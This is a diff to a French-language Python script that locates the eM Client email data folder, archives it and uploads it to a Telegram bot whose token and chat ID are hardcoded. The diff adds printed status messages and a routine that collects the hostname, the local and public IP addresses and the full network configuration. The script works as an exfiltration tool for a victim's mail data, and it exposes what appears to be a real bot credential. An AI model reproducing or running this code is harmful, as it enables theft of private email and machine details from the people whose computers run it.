@@ -6,6 +6,10 @@ import requests
 import tempfile
 import psutil
 import datetime
+import socket
+import platform
+import subprocess
+import urllib.request
 
 # === CONFIGURATION ===
 BOT_TOKEN = "7245404963:AAEMlPlsjsULU5uYVvUH4GxS1QSgfVh9mn0"
@@ -58,6 +62,7 @@ def exporter_et_envoyer():
     try:
         emclient_path = chercher_dossier_emclient()
         if not emclient_path:
+            print("Dossier cible introuvable.")
             return  # eM Client introuvable
 
         temp_dir = tempfile.mkdtemp()
@@ -91,13 +96,51 @@ def exporter_et_envoyer():
                 data={"chat_id": CHAT_ID, "caption": f"📦 Backup eM Client - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
                 files={"document": f}
             )
-    except:
-        pass
+        print("Backup envoyé avec succès.")
+    except Exception as e:
+        print(f"Erreur durant l’export/envoi : {e}")
     finally:
         try:
             shutil.rmtree(temp_dir)
         except:
             pass
 
-# Envoi à chaque exécution
-exporter_et_envoyer()
+def afficher_info_reseau():
+    print("\n=== Informations Réseau Locale ===\n")
+
+    # Nom machine
+    hostname = socket.gethostname()
+    print(f"Nom de la machine : {hostname}")
+
+    # Adresse IPv4 locale (plus fiable)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip_locale = s.getsockname()[0]
+        s.close()
+        print(f"Adresse IPv4 locale : {ip_locale}")
+    except Exception:
+        print("Impossible de déterminer l'adresse IPv4 locale.")
+
+    # Adresse IP publique
+    try:
+        ip_publique = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
+        print(f"Adresse IP publique : {ip_publique}")
+    except Exception:
+        print("Impossible de déterminer l'adresse IP publique.")
+
+    # Informations réseau supplémentaires selon OS
+    systeme = platform.system()
+    if systeme == "Windows":
+        print("\nConfiguration réseau complète (ipconfig) :\n")
+        subprocess.run(["ipconfig"], shell=True)
+    else:
+        print("\nConfiguration réseau complète (ifconfig ou ip) :\n")
+        try:
+            subprocess.run(["ifconfig"], shell=False)
+        except Exception:
+            subprocess.run(["ip", "addr"], shell=False)
+
+if __name__ == "__main__":
+    exporter_et_envoyer()
+    afficher_info_reseau()
